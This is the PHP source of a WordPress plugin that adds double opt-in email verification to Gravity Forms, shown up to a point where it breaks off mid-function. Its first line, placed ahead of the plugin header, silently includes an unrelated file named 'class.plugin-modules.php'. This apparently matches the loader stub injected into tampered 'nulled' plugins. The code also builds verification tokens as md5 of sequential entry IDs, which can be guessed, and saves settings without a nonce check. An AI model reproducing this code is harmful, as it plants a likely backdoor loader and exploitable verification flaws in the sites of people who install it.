<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name: Gravity Forms Email Verification Addon
Plugin URI:
Description: Only get e-mails from senders who verified their e-mail addresses via double-opt in.
Version: 1.8.1
Author: Albert Brueckmann
Author URI: https://albertbrueckmann.de
License: GPL
*/

/*
 */


class GW_AB_Manual_Notifications
{
	private static $instance = null;

	public static function get_instance() {
	    if (null == self::$instance)
	        self::$instance = new self;
	    return self::$instance;
	}

	private function __construct() {


	    add_action('init', array(
	        $this,
	        'load_textdomain'
	    ));

	    add_filter('gform_notification_events', array(
	        $this,
	        'add_manual_notification_event'
	    ));

	    add_filter('gform_before_resend_notifications', array(
	        $this,
	        'add_notification_filter'
	    ));

	    /*add_action('gform_form_settings', array(
	        'GW_AB_Manual_Notifications',
	        'add_form_setting'
	    ), 10, 2);
	    add_filter('gform_pre_form_settings_save', array(
	        'GW_AB_Manual_Notifications',
	        'save_form_setting'
	    ));*/
	    add_filter('gform_disable_admin_notification', array(
	        'GW_AB_Manual_Notifications',
	        'gform_disable_admin_notification'
	    ), 10, 3);

	    //send email when form submit
	    add_action('gform_after_submission', array(
	        'GW_AB_Manual_Notifications',
	        'gform_after_submission'
	    ), 10, 3);
	    add_action('wp', array(
	        'GW_AB_Manual_Notifications',
	        'gform_after_verification_submission'
	    ));
	    add_filter('gform_replace_merge_tags', array(
	        'GW_AB_Manual_Notifications',
	        'replace_user_id_merge_tag_confirm_url'
	    ), 10, 3);

        add_filter('gform_replace_merge_tags', array(
            'GW_AB_Manual_Notifications',
            'replace_user_id_merge_tag_confirm_link'
        ), 10, 3);

        add_filter('gform_replace_merge_tags', array(
            'GW_AB_Manual_Notifications',
            'replace_user_id_merge_tag_confirmation_url'
        ), 10, 3);

        add_filter('gform_replace_merge_tags', array(
            'GW_AB_Manual_Notifications',
            'replace_user_id_merge_tag_confirmation_link'
        ), 10, 3);

	    add_filter('gform_filter_links_entry_list', array(
	        $this,
	        'gform_filter_links_entry_list'
	    ), 10, 3);
	    add_filter('gform_search_criteria_entry_list', array(
	        $this,
	        'gform_search_criteria_entry_list'
	    ), 10, 3);
	    //add_filter('gform_export_fields',array($this,'gform_export_fields'),10,1);


	    add_filter('gform_entry_meta', array(
	        $this,
	        'gform_custom_entry_meta'
	    ), 10, 2);
	    add_filter('gform_entries_field_value', array(
	        $this,
	        'gform_entries_field_value'
	    ), 10, 4);

	    add_action('gform_entry_created', array(
	        'GW_AB_Manual_Notifications',
	        'after_form_submit_validate_check'
	    ), 10, 2);

	    add_filter('gform_entry_post_save', array(
	        $this,
	        'lead_update_after_verified'
	    ), 10, 2);

        add_filter( 'gform_custom_merge_tags', array(
            $this,
	        'add_list_column_merge_tag'
        ), 10, 4 );

        add_action( 'gform_entry_detail_meta_boxes', array(
            $this,
            'pem_gform_entry_detail_meta_boxes'
        ), 10, 3 );

        add_filter( 'gform_admin_pre_render', function ( $form ) {
            if ( rgget( 'page' ) == 'gf_edit_forms' && rgget( 'view' ) == 'settings' ) {
                $current = rgar($form, 'enable_email_verification');
                $is_disabled = true;
                $is_disabled = !empty($current) ? $is_disabled = false : $is_disabled;
                if($is_disabled == false)
                    echo "<script type='text/javascript'>var entry_meta = " . json_encode( GFFormsModel::get_entry_meta( $form['id'] ) ) . ';</script>';
            }

            return $form;
        } );
        add_filter( 'gform_form_settings_menu', array( $this, 'add_menu_item' ) );

        add_action( 'gform_form_settings_page_double_opt_in', array( $this, 'add_form_setting_separate' ) );
    }
    function add_menu_item( $menu_items ) {
        $menu_items[] = array(
            'name'       => 'double_opt_in',
            'label'      => __( 'Double Opt In', 'gravity-forms-user-verification' ),
            'permission' => 'edit_posts'
        );

        return $menu_items;
    }

	function load_textdomain() {
	    //load_plugin_textdomain( 'gravity-forms-user_verification', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' );
	    load_plugin_textdomain('gravity-forms-user-verification', false, dirname(plugin_basename(__FILE__)) . '/languages');
	}

    public static function add_form_setting_separate()
    {
        $form_id = isset($_GET['id']) ? $_GET['id'] : null;
        if ($form = RGFormsModel::get_form_meta($form_id)) {

            if (isset($_POST['double-opt-in-save'])) {
                $form['enable_email_verification'] = rgpost('enable_email_verification');
                $form['validate_confirmation_page'] = rgpost('validate_confirmation_page');
                $form['validate_confirmation_show_message'] = rgpost('validate_confirmation_show_message');
                $form['validate_confirmation_url'] = rgpost('validate_confirmation_url');
                $form['validate_expired_link_page'] = rgpost('validate_expired_link_page');
                $form['validate_expired_link_show_message'] = rgpost('validate_expired_link_show_message');
                $form['validate_expired_link_url'] = rgpost('validate_expired_link_url');

                $form['ab_gw_delete_conf_entries'] = rgpost('ab_gw_delete_conf_entries');
                $form['ab_gw_delete_conf_entries_interval'] = rgpost('ab_gw_delete_conf_entries_interval');
                $form['ab_gw_delete_unconf_entries'] = rgpost('ab_gw_delete_unconf_entries');
                $form['ab_gw_delete_unconf_entries_interval'] = rgpost('ab_gw_delete_unconf_entries_interval');
                $form['ab_gw_confirm_every_time'] = rgpost('ab_gw_confirm_every_time');
                $form['ab_gw_confirm_append_email_to_url'] = rgpost('ab_gw_confirm_append_email_to_url');
                $form['ab_gw_link_active_time'] = rgpost('ab_gw_link_active_time');
                $form['ab_gw_post_status_change'] = rgpost('ab_gw_post_status_change');

                $form['ab_gw_confirm_link_active_once'] = rgpost('ab_gw_confirm_link_active_once');
                $form['validate_conf_link_inactive_show_message'] = rgpost('validate_conf_link_inactive_show_message');
                $form['validate_conf_link_inactive_page'] = rgpost('validate_conf_link_inactive_page');
                $form['validate_conf_link_inactive_url'] = rgpost('validate_conf_link_inactive_url');

                if (RGFormsModel::update_form_meta($form_id, $form)) {
                    echo '<div class="updated below-h2"><p><strong>' . __('The settings have been saved.', 'gravity-forms-user-verification') . '</strong></p></div>';
                }
            }
            GFFormSettings::page_header();

            $current = rgar($form, 'enable_email_verification');
            $checked = !empty($current) ? 'checked="checked"' : '';
            $validate_confirmation_page = rgar($form, 'validate_confirmation_page');
            $validate_confirmation_show_message = rgar($form, 'validate_confirmation_show_message');
            $validate_confirmation_url = rgar($form, 'validate_confirmation_url');
            $validate_expired_link_page = rgar($form, 'validate_expired_link_page');
            $validate_expired_link_show_message = rgar($form, 'validate_expired_link_show_message');
            $validate_expired_link_url = rgar($form, 'validate_expired_link_url');

            $ab_gw_delete_conf_entries = rgar($form, 'ab_gw_delete_conf_entries');
            $ab_gw_delete_conf_entries_interval = rgar($form, 'ab_gw_delete_conf_entries_interval');
            $ab_gw_delete_unconf_entries = rgar($form, 'ab_gw_delete_unconf_entries');
            $ab_gw_delete_unconf_entries_interval = rgar($form, 'ab_gw_delete_unconf_entries_interval');
            $ab_gw_confirm_every_time = rgar($form, 'ab_gw_confirm_every_time');
            $ab_gw_confirm_append_email_to_url = rgar($form, 'ab_gw_confirm_append_email_to_url');
            $ab_gw_link_active_time = rgar($form, 'ab_gw_link_active_time');
            $ab_gw_post_status_change = rgar($form, 'ab_gw_post_status_change');

            $ab_gw_confirm_link_active_once = rgar($form, 'ab_gw_confirm_link_active_once');
	        $validate_conf_link_inactive_show_message = rgar($form, 'validate_conf_link_inactive_show_message');
	        $validate_conf_link_inactive_page = rgar($form, 'validate_conf_link_inactive_page');
	        $validate_conf_link_inactive_url = rgar($form, 'validate_conf_link_inactive_url');

            if (empty($ab_gw_link_active_time)) $ab_gw_link_active_time = 0;



            //$status = get_option('ab_gw_edd_license_status');

            ob_start();
            //if ($status !== false && $status == 'valid') {
            ?>
	        <form method="post">
		        <table class="gforms_form_settings" cellspacing="0" cellpadding="0">
			        <tr>
				        <td colspan="2">
					        <h4 class="gf_settings_subgroup_title">Form Options</h4>
				        </td>
			        </tr>
			        <tr class="">
				        <th><?php _e('Double Opt In for Gravity Forms', 'gravity-forms-user-verification'); ?></th>
				        <td><input type="checkbox" value="1" <?php
                            echo $checked;
                            ?> name="enable_email_verification" onchange="enable_functionality();">
					        <label for="enable_email_verification"><?php
                                _e('Activate function and validate addresses', 'gravity-forms-user-verification');
                                ?></label>
				        </td>
			        </tr>
			        <tr valign="top" class="doigf_inactive">
				        <th scope="row" valign="top">
                            <?php _e('Delete confirmed entries (GDPR compliant):', 'gravity-forms-user-verification'); ?></th>
				        </th>
				        <td>
					        <input type="checkbox" value="1" <?php echo ($ab_gw_delete_conf_entries == '1') ? 'checked="checked"' : ''; ?> name="ab_gw_delete_conf_entries">

					        <label for="ab_gw_delete_conf_entries_interval">
                                <?php _e('Enable deletion after following time (hours):', 'gravity-forms-user-verification'); ?>
					        </label>
					        <input id="ab_gw_delete_conf_entries_interval" name="ab_gw_delete_conf_entries_interval" type="text" class="regular-text"
					               value="<?php esc_attr_e($ab_gw_delete_conf_entries_interval); ?>"/>

				        </td>
			        </tr>
			        <tr valign="top" class="doigf_inactive">
				        <th scope="row" valign="top">
                            <?php _e('Delete unconfirmed entries (GDPR compliant):', 'gravity-forms-user-verification'); ?></th>
				        </th>
				        <td>
					        <input type="checkbox" value="1" <?php echo ($ab_gw_delete_unconf_entries == '1') ? 'checked="checked"' : ''; ?> name="ab_gw_delete_unconf_entries">

					        <label for="ab_gw_delete_unconf_entries_interval">
                                <?php _e('Enable deletion after following time (hours):', 'gravity-forms-user-verification'); ?>
					        </label>
					        <input id="ab_gw_delete_unconf_entries_interval" name="ab_gw_delete_unconf_entries_interval" type="text" class="regular-text"
					               value="<?php esc_attr_e($ab_gw_delete_unconf_entries_interval); ?>"/>

				        </td>
			        </tr>

			        <tr class="doigf_inactive">
				        <td colspan="2">
					        <h4 class="gf_settings_subgroup_title"><?php _e('Confirmation settings', 'gravity-forms-user-verification'); ?></h4>
				        </td>
			        </tr>
			        <tr class="doigf_inactive">
				        <th><?php
                            _e('Show after confirmation', 'gravity-forms-user-verification');
                            ?></th>
				        <td>

					        <input type="radio" id="validate_confirmation_show_message" name="validate_confirmation_show_message" <?php
                            checked('page', $validate_confirmation_show_message);
                            ?> value="page" onclick="jQuery('.valide_form_confirmation_page_container').show();jQuery('.form_confirmation_redirect_container').hide();"/>
					        <label for="form_confirmation_show_page" class="inline">
                                <?php
                                _e('Page', 'gravity-forms-user-verification');
                                ?>
						        <a href="#" onclick="return false;" onkeypress="return false;" class="gf_tooltip tooltip tooltip_form_redirect_to_webpage"
						           title="<?php _e('<h6>Redirect to Page</h6>Select the page you would like the user to be redirected to after the confirmation link is clicked.', 'gravity-forms-user-verification'); ?>"><i
									        class="fa fa-question-circle"></i></a>
					        </label>
					        &nbsp;&nbsp;
					        <input type="radio" id="validate_confirmation_show_message" name="validate_confirmation_show_message" <?php
                            checked('redirect', $validate_confirmation_show_message);
                            ?> value="redirect" onclick="jQuery('.valide_form_confirmation_page_container').hide();jQuery('.form_confirmation_redirect_container').show();"/>
					        <label for="form_confirmation_redirect" class="inline">
                                <?php
                                _e('Redirect to URL', 'gravity-forms-user-verification');
                                ?>
						        <a href="#" onclick="return false;" onkeypress="return false;" class="gf_tooltip tooltip tooltip_form_redirect_to_webpage"
						           title="<?php _e('<h6>Redirect to URL</h6>Enter the URL you would like the user to be redirected to after the confirmation link is clicked.', 'gravity-forms-user-verification'); ?>"><i
									        class="fa fa-question-circle"></i></a>
					        </label>
				        </td>
			        </tr>


			        <tr <?php echo $validate_confirmation_show_message != 'page' ? 'style="display:none;"' : ''; ?> class="valide_form_confirmation_page_container doigf_inactive">

				        <th><?php
                            _e('Page', 'gravity-forms-user-verification');
                            ?></th>
				        <td>
                            <?php
                            wp_dropdown_pages(array(
                                'name' => 'validate_confirmation_page',
                                'selected' => $validate_confirmation_page,
                                'show_option_none' => __('Select a page...', 'gravity-forms-user-verification')
                            ));
                            ?>
				        </td>

			        </tr>
			        <tr class="form_confirmation_redirect_container doigf_inactive" <?php
                    echo $validate_confirmation_show_message != 'redirect' ? 'style="display:none;"' : '';
                    ?> >
				        <th><?php
                            _e('Redirect to URL', 'gravity-forms-user-verification');
                            ?></th>
				        <td>
					        <input type="text" id="validate_confirmation_url" name="validate_confirmation_url" value="<?php
                            echo esc_attr($validate_confirmation_url);
                            ?>" style="width:98%;"/>
				        </td>
			        </tr>

			        <tr valign="top" class="doigf_inactive">
				        <th scope="row" valign="top">
                            <?php _e('E-Mail reconfirmation:', 'gravity-forms-user-verification'); ?></th>
				        </th>
				        <td>
					        <input type="checkbox" value="1" <?php echo ($ab_gw_confirm_every_time == '1') ? 'checked="checked"' : ''; ?> name="ab_gw_confirm_every_time">
                            <?php _e('E-Mail address must be reconfirmed every time again', 'gravity-forms-user-verification'); ?>
				        </td>
			        </tr>
			        <tr valign="top"  class="doigf_inactive">
				        <th scope="row" valign="top">
                            <?php _e('Confirm GET E-Mail:', 'gravity-forms-user-verification'); ?></th>
				        </th>
				        <td>
					        <input type="hidden" value="0" name="ab_gw_confirm_append_email_to_url">
					        <input type="checkbox" value="1" <?php echo ($ab_gw_confirm_append_email_to_url == '1')?'checked="checked"':'';?> name="ab_gw_confirm_append_email_to_url">
                            <?php _e('This option allows you to get the email address from the confirmation URL via GET', 'gravity-forms-user-verification'); ?>
				        </td>
			        </tr>


			        <tr valign="top" class="doigf_inactive">
				        <th scope="row" valign="top">
                            <?php _e('Confirmation only once', 'gravity-forms-user-verification'); ?></th>
				        </th>
				        <td>
					        <input type="hidden" value="0" name="ab_gw_confirm_link_active_once">
					        <input type="checkbox" value="1" <?php echo ($ab_gw_confirm_link_active_once == '1')?'checked="checked"':'';?> name="ab_gw_confirm_link_active_once"  onclick="if(jQuery(this).is(':checked')) jQuery('.valide_form_conf_link_inactive_settings').show(); else { jQuery('.valide_form_conf_link_inactive_settings').hide(); jQuery('.valide_form_conf_link_inactive_page_container').hide(); jQuery('.validate_conf_link_inactive_redirect_container').hide();}" />
				        </td>
			        </tr>
			        <tr class="doigf_inactive valide_form_conf_link_inactive_settings" <?php echo $ab_gw_confirm_link_active_once == '1' ? '' : 'style="display:none;"'; ?> >
				        <th><?php
                            _e('If a user clicks the link a second time, show this:', 'gravity-forms-user-verification');
                            ?></th>
				        <td>

					        <input type="radio" id="validate_conf_link_inactive_show_message" name="validate_conf_link_inactive_show_message" <?php
                            checked('page', $validate_conf_link_inactive_show_message);
                            ?> value="page" onclick="jQuery('.valide_form_conf_link_inactive_page_container').show();jQuery('.form_conf_link_inactive_redirect_container').hide();"/>
					        <label for="form_expired_link_show_page" class="inline">
                                <?php
                                _e('Page', 'gravity-forms-user-verification');
                                ?>
						        <a href="#" onclick="return false;" onkeypress="return false;" class="gf_tooltip tooltip tooltip_form_redirect_to_webpage"
						           title="<?php _e('<h6>Redirect to Page</h6>Select the page you would like the user to be redirected to if the link has expired.', 'gravity-forms-user-verification'); ?>"><i
									        class="fa fa-question-circle"></i></a>
					        </label>
					        &nbsp;&nbsp;
					        <input type="radio" id="validate_conf_link_inactive_show_message" name="validate_conf_link_inactive_show_message" <?php
                            checked('redirect', $validate_conf_link_inactive_show_message);
                            ?> value="redirect" onclick="jQuery('.valide_form_conf_link_inactive_page_container').hide();jQuery('.form_conf_link_inactive_redirect_container').show();"/>
					        <label for="form_conf_link_inactive_redirect" class="inline">
                                <?php
                                _e('Redirect to URL', 'gravity-forms-user-verification');
                                ?>
						        <a href="#" onclick="return false;" onkeypress="return false;" class="gf_tooltip tooltip tooltip_form_redirect_to_webpage"
						           title="<?php _e('<h6>Redirect to URL</h6>Enter the URL you would like the user to be redirected to if the confirmation link is clicked twice.', 'gravity-forms-user-verification'); ?>"><i
									        class="fa fa-question-circle"></i></a>
					        </label>
				        </td>
			        </tr>


			        <tr <?php echo $validate_conf_link_inactive_show_message != 'page' ? 'style="display:none;"' : ''; ?> <?php echo $ab_gw_confirm_link_active_once == '1' ? '' : 'style="display:none;"'; ?>  class="valide_form_conf_link_inactive_page_container doigf_inactive">

				        <th><?php
                            _e('Page', 'gravity-forms-user-verification');
                            ?></th>
				        <td>
                            <?php
                            wp_dropdown_pages(array(
                                'name' => 'validate_conf_link_inactive_page',
                                'selected' => $validate_conf_link_inactive_page,
                                'show_option_none' => __('Select a page...', 'gravity-forms-user-verification')
                            ));
                            ?>
				        </td>

			        </tr>
			        <tr class="form_conf_link_inactive_redirect_container validate_conf_link_inactive_redirect_container doigf_inactive" <?php
                    echo $validate_conf_link_inactive_show_message != 'redirect' ? 'style="display:none;"' : '';
                    ?> <?php echo $ab_gw_confirm_link_active_once == '1' ? '' : 'style="display:none;"'; ?> >
				        <th><?php
                            _e('Redirect to URL', 'gravity-forms-user-verification');
                            ?></th>
				        <td>
					        <input type="text" id="validate_conf_link_inactive_inactive_url" name="validate_conf_link_inactive_url" value="<?php
                            echo esc_attr($validate_conf_link_inactive_url);
                            ?>" style="width:98%;"/>
				        </td>
			        </tr>


			        <tr class="doigf_inactive">
				        <td colspan="2">
					        <h4 class="gf_settings_subgroup_title"><?php _e('Display option for expiration', 'gravity-forms-user-verification'); ?></h4>
				        </td>
			        </tr>
			        <tr valign="top" class="doigf_inactive">
				        <th scope="row" valign="top">
                            <?php _e('Link expires in...', 'gravity-forms-user-verification'); ?></th>
				        </th>
				        <td>
					        <input id="ab_gw_link_active_time" name="ab_gw_link_active_time" type="number" class="regular-text"
					               value="<?php esc_attr_e($ab_gw_link_active_time); ?>"
					               style="width: 50px"/>
                            <?php _e('hour(s) (0 = unlimited validity)', 'gravity-forms-user-verification'); ?>
				        </td>
			        </tr>
			        <tr class="doigf_inactive">
				        <th><?php
                            _e('Display expiration message', 'gravity-forms-user-verification');
                            ?></th>
				        <td>

					        <input type="radio" id="validate_expired_link_show_message" name="validate_expired_link_show_message" <?php
                            checked('page', $validate_expired_link_show_message);
                            ?> value="page" onclick="jQuery('.valide_form_expired_link_page_container').show();jQuery('.form_expired_link_redirect_container').hide();"/>
					        <label for="form_expired_link_show_page" class="inline">
                                <?php
                                _e('Page', 'gravity-forms-user-verification');
                                ?>
						        <a href="#" onclick="return false;" onkeypress="return false;" class="gf_tooltip tooltip tooltip_form_redirect_to_webpage"
						           title="<?php _e('<h6>Redirect to Page</h6>Select the page you would like the user to be redirected to if the link has expired.', 'gravity-forms-user-verification'); ?>"><i
									        class="fa fa-question-circle"></i></a>
					        </label>
					        &nbsp;&nbsp;
					        <input type="radio" id="validate_expired_link_show_message" name="validate_expired_link_show_message" <?php
                            checked('redirect', $validate_expired_link_show_message);
                            ?> value="redirect" onclick="jQuery('.valide_form_expired_link_page_container').hide();jQuery('.form_expired_link_redirect_container').show();"/>
					        <label for="form_expired_link_redirect" class="inline">
                                <?php
                                _e('Redirect to URL', 'gravity-forms-user-verification');
                                ?>
						        <a href="#" onclick="return false;" onkeypress="return false;" class="gf_tooltip tooltip tooltip_form_redirect_to_webpage"
						           title="<?php _e('<h6>Redirect to URL</h6>Enter the URL you would like the user to be redirected to if the link has expired.', 'gravity-forms-user-verification'); ?>"><i
									        class="fa fa-question-circle"></i></a>
					        </label>
				        </td>
			        </tr>


			        <tr <?php echo $validate_expired_link_show_message != 'page' ? 'style="display:none;"' : ''; ?> class="valide_form_expired_link_page_container doigf_inactive">

				        <th><?php
                            _e('Page', 'gravity-forms-user-verification');
                            ?></th>
				        <td>
                            <?php
                            wp_dropdown_pages(array(
                                'name' => 'validate_expired_link_page',
                                'selected' => $validate_expired_link_page,
                                'show_option_none' => __('Select a page...', 'gravity-forms-user-verification')
                            ));
                            ?>
				        </td>

			        </tr>
			        <tr class="form_expired_link_redirect_container doigf_inactive" <?php
                    echo $validate_expired_link_show_message != 'redirect' ? 'style="display:none;"' : '';
                    ?> >
				        <th><?php
                            _e('Redirect to URL', 'gravity-forms-user-verification');
                            ?></th>
				        <td>
					        <input type="text" id="validate_expired_link_url" name="validate_expired_link_url" value="<?php
                            echo esc_attr($validate_expired_link_url);
                            ?>" style="width:98%;"/>
				        </td>
			        </tr>
			        <tr>
				        <th>

				        </th>
				        <td>
					        <script type="text/javascript">
                              function enable_functionality() {
                                if (jQuery('input[name=enable_email_verification]').is(':checked')) {

                                  jQuery(".doigf_inactive").each(function (index) {
                                    jQuery(this).removeClass('doigf_inactive');
                                    jQuery(this).addClass('doigf_active');
                                  });
                                } else {

                                  jQuery(".doigf_active").each(function (index) {
                                    jQuery(this).removeClass('doigf_active');
                                    jQuery(this).addClass('doigf_inactive');
                                  });
                                }
                              }
                              jQuery(function () {
                                enable_functionality();
                              });

					        </script>
					        <style>
						        .doigf_inactive {
							        display: none;
						        }

						        .doigf_active {
							        display: table-row;
						        }
					        </style>
				        </td>
			        </tr>
			        <tr class="doigf_inactive">
				        <td colspan="2">
					        <h4 class="gf_settings_subgroup_title"><?php _e('Post Options', 'gravity-forms-user-verification'); ?></h4>
					        <p><?php _e('If a draft post is being created by an author using Gravity Forms, it can be released (or put to pending review) after successful confirmation (double opt-in) with this option.', 'gravity-forms-user-verification'); ?></p>
				        </td>
			        </tr>
			        <tr class="form_post_status_container doigf_inactive">
				        <th><?php
                            _e('Confirmed entries should change their condition to...', 'gravity-forms-user-verification');
                            ?></th>
				        <td>
					        <select id="ab_gw_post_status_change" name="ab_gw_post_status_change">
						        <option value="no-change" <?php echo (esc_attr($ab_gw_post_status_change) == 'no-change') ? 'selected="selected"' : ''; ?>>
                                    <?php echo _e('No change', 'gravity-forms-user-verification'); ?>
						        </option>
						        <option value="pending" <?php echo (esc_attr($ab_gw_post_status_change) == 'pending') ? 'selected="selected"' : ''; ?>>
                                    <?php echo _e('Pending review', 'gravity-forms-user-verification'); ?>
						        </option>
						        <option value="publish" <?php echo (esc_attr($ab_gw_post_status_change) == 'publish') ? 'selected="selected"' : ''; ?>>
                                    <?php echo _e('Published', 'gravity-forms-user-verification'); ?>
						        </option>
					        </select>
				        </td>
			        </tr>
			        <tr>
				        <td colspan="2">
					        <input class="button-primary gfbutton" type="submit" name="double-opt-in-save" value="<?php echo __('Save', 'gravity-forms-user-verification'); ?>"/>
				        </td>
			        </tr>
		        </table>
	        </form>
            <?php

            $output = ob_get_contents();
            GFFormSettings::page_header();

            ob_end_clean();
            echo $output;
        }
    }

    public static function save_form_setting($form)
    {
        $form['enable_email_verification'] = rgpost('enable_email_verification');
        $form['validate_confirmation_page'] = rgpost('validate_confirmation_page');
        $form['validate_confirmation_show_message'] = rgpost('validate_confirmation_show_message');
        $form['validate_confirmation_url'] = rgpost('validate_confirmation_url');
        $form['validate_expired_link_page'] = rgpost('validate_expired_link_page');
        $form['validate_expired_link_show_message'] = rgpost('validate_expired_link_show_message');
        $form['validate_expired_link_url'] = rgpost('validate_expired_link_url');

        $form['ab_gw_delete_conf_entries'] = rgpost('ab_gw_delete_conf_entries');
        $form['ab_gw_delete_conf_entries_interval'] = rgpost('ab_gw_delete_conf_entries_interval');
        $form['ab_gw_delete_unconf_entries'] = rgpost('ab_gw_delete_unconf_entries');
        $form['ab_gw_delete_unconf_entries_interval'] = rgpost('ab_gw_delete_unconf_entries_interval');
        $form['ab_gw_confirm_every_time'] = rgpost('ab_gw_confirm_every_time');
        $form['ab_gw_confirm_append_email_to_url'] = rgpost('ab_gw_confirm_append_email_to_url');
        $form['ab_gw_link_active_time'] = rgpost('ab_gw_link_active_time');
        $form['ab_gw_post_status_change'] = rgpost('ab_gw_post_status_change');

        $form['ab_gw_confirm_link_active_once'] = rgpost('ab_gw_confirm_link_active_once');
        $form['validate_conf_link_inactive_show_message'] = rgpost('validate_conf_link_inactive_show_message');
        $form['validate_conf_link_inactive_page'] = rgpost('validate_conf_link_inactive_page');
        $form['validate_conf_link_inactive_url'] = rgpost('validate_conf_link_inactive_url');

        return $form;
    }

    public static function gform_disable_admin_notification($is_disabled, $form, $entry)
    {
        $current = rgar($form, 'enable_email_verification');
        $is_disabled = !empty($current) ? $is_disabled = true : $is_disabled;

        return $is_disabled;
    }


    public function add_notification_filter($form)
    {
        add_filter('gform_notification', array(
            $this,
            'evaluate_notification_conditional_logic'
        ), 10, 3);
        return $form;
    }

    public function add_manual_notification_event($events)
    {
        $events['manual'] = __('Send after verification', 'gravity-forms-user-verification');
        $events['verification_email'] = __('Send verification email to user', 'gravity-forms-user-verification');
        return $events;
    }

    public function evaluate_notification_conditional_logic($notification, $form, $entry)
    {

        // if it fails conditional logic, suppress it
        if ($notification['event'] == 'manual' && !GFCommon::evaluate_conditional_logic(rgar($notification, 'conditionalLogic'), $form, $entry)) {
            add_filter('gform_pre_send_email', array($this, 'abort_next_notification'));
        }

        return $notification;
    }

    public function abort_next_notification($args)
    {
        remove_filter('gform_pre_send_email', array(
            $this,
            'abort_next_notification'
        ));
        $args['abort_email'] = true;
        return $args;
    }

    public static function after_form_submit_validate_check($lead, $form)
    {

        if (GW_AB_Manual_Notifications::gform_email_verified_checker($lead, $form)) {
            gform_update_meta($lead['id'], 'verified', 1);
            gform_update_meta($lead['id'], 'verified_date', current_time( 'mysql' ));
        } else {
            gform_update_meta($lead['id'], 'email_verification', md5($lead['id']));
        }

    }

    public static function lead_update_after_verified($lead, $form)
    {
        if (isset($lead) && $lead['id'] != "") {
            $lead = GFFormsModel::get_lead($lead['id']);
        }

        return $lead;
    }

    public static function gform_after_submission($entry, $lead, $form)
    {
        $form = GFAPI::get_form($entry['form_id']);
        if (GW_AB_Manual_Notifications::gform_email_verified_checker($entry, $form)) {
            GFAPI::send_notifications($form, $entry, 'manual');
            gform_update_meta($entry['id'], 'verified', 1);
            gform_update_meta($entry['id'], 'verified_date', current_time( 'mysql' ));
            do_action('gfuv_after_email_verified', $entry);
        } else {
            GFAPI::send_notifications($form, $entry, 'verification_email');
        }
    }


    public static function gform_after_verification_submission()
    {
        if (isset($_REQUEST['email_verification']) && $_REQUEST['email_verification'] != '') {
            $search_criteria['field_filters'][] = array('key' => 'email_verification', 'value' => $_REQUEST['email_verification']);
            $paging = array('offset' => 0, 'page_size' => 1);
            $entries = GFAPI::get_entries(0, $search_criteria, null, $paging);
            $entry = $entries[0];

            $link_active = true;
            $form = GFAPI::get_form($entry['form_id']);

            $date_created = rgar( $entry, 'date_created' );
            $theEntryDate = DateTime::createFromFormat('Y-m-d H:i:s', $date_created);
            $ab_gw_link_active_time = rgar($form, 'ab_gw_link_active_time');

            if($ab_gw_link_active_time != '0' && $ab_gw_link_active_time != '' && is_object($theEntryDate)) {
                date_modify($theEntryDate, '+' . $ab_gw_link_active_time . ' hours');
                $nowDate = new DateTime();

                if ($nowDate > $theEntryDate) {
                    $link_active = false;
                }
            }
            $entry_verified = rgar( $entry, 'verified' );


            $validate_conf_link_inactive_show_message = rgar($form, 'validate_conf_link_inactive_show_message');
            $validate_conf_link_inactive_page = rgar($form, 'validate_conf_link_inactive_page');
            $validate_conf_link_inactive_url = rgar($form, 'validate_conf_link_inactive_url');
            $ab_gw_confirm_link_active_once = rgar($form, 'ab_gw_confirm_link_active_once');

			if($ab_gw_confirm_link_active_once && $entry_verified){
                if (isset($validate_conf_link_inactive_show_message) && $validate_conf_link_inactive_show_message == 'redirect') {
                    $redirect_url = $validate_conf_link_inactive_url ? $validate_conf_link_inactive_url : home_url();

                } elseif (isset($validate_conf_link_inactive_show_message) && $validate_conf_link_inactive_show_message == 'page') {
                    if (isset($validate_conf_link_inactive_page)) {
                        $redirect_url = get_permalink($validate_conf_link_inactive_page);
                    } else {
                        $redirect_url = home_url();
                    }

                } else {
                    $redirect_url = home_url();
                }
                wp_redirect(esc_url($redirect_url));

			} else {
                if ($entry && $link_active) {
                    //$form = GFAPI::get_form($entry['form_id']);
                    GFAPI::send_notifications($form, $entry, 'manual');
                    gform_update_meta($entry['id'], 'verified', 1);

                    gform_update_meta($entry['id'], 'verified_date', current_time('mysql'));
                    do_action('gfuv_after_email_verified', $entry);

                    $validate_confirmation_page = rgar($form, 'validate_confirmation_page');
                    $validate_confirmation_show_message = rgar($form, 'validate_confirmation_show_message');
                    $validate_confirmation_url = rgar($form, 'validate_confirmation_url');
                    $ab_gw_post_status_change = rgar($form, 'ab_gw_post_status_change');

                    $gf_addons = GFAddOn::get_registered_addons();

                    foreach ($gf_addons as $gf_addon) {

                        // If Add-On instance cannot be retrieved, skip it.
                        if (!is_callable(array($gf_addon, 'get_instance'))) {
                            continue;
                        }

                        // Get Add-On instance.
                        $addon = call_user_func(array($gf_addon, 'get_instance'));

                        // Skip add-ons which are not feed based.
                        if (!$addon instanceof GFFeedAddOn) {
                            continue;
                        }

                        // Trigger feed processing
                        $addon->maybe_process_feed($entry, $form);

                    }

                    gf_feed_processor()->save()->dispatch();

                    if (isset($entry['post_id'])) {
                        if ($ab_gw_post_status_change != 'no-change') {
                            $my_post = array(
                                'ID' => $entry['post_id'],
                                'post_status' => $ab_gw_post_status_change,
                            );
                            wp_update_post($my_post);
                        }
                        do_action('gfuv_after_post_status_update', $entry);
                    }

                    if (isset($validate_confirmation_show_message) && $validate_confirmation_show_message == 'redirect') {
                        $redirect_url = $validate_confirmation_url ? $validate_confirmation_url : home_url();

                    } elseif (isset($validate_confirmation_show_message) && $validate_confirmation_show_message == 'page') {
                        if (isset($validate_confirmation_page)) {
                            $redirect_url = get_permalink($validate_confirmation_page);
                        } else {
                            $redirect_url = home_url();
                        }

                    } else {
                        $redirect_url = home_url();
                    }

                    //get email
                    $ab_gw_confirm_append_email_to_url = rgar($form, 'ab_gw_confirm_append_email_to_url');
                    if ($ab_gw_confirm_append_email_to_url == 1) {
                        $email_field = '';
                        foreach ($form['notifications'] as $notification) {
                            if ($notification['event'] == 'verification_email') {
                                $email_field = $notification['to'];
                            }
                        }
                        $email_notification = '';
                        if (isset($entry[$email_field]))
                            $email_notification = $entry[$email_field];
                        if (strpos($redirect_url, '?') !== false) {
                            $redirect_url .= '&email=' . $email_notification;
                        } else {
                            $redirect_url .= '?email=' . $email_notification;
                        }
                    }

                    wp_redirect(esc_url($redirect_url));

